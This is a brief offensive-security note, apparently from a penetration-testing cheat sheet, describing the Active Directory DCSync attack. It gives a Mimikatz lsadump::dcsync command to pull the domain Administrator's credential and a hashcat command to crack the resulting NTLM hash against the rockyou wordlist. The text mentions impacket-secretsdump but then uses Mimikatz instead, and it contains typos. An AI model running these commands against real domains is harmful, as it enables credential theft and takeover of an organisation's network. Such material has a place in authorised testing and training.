When the AD has to synchronize the domains, it runs the Directory Replication Service (DRS) Remote Protocol. Because the domain doesnpt verify the origin of the request, we can perform a **dcsync** attack that could dump any user credential in the domain. We can use the `impacket-secretsdump` utility. First we run Mimikatz with the dsync attack.

```powershell
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
```

We crack the NTLM HASH with hashcat

```powershell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt --force
```
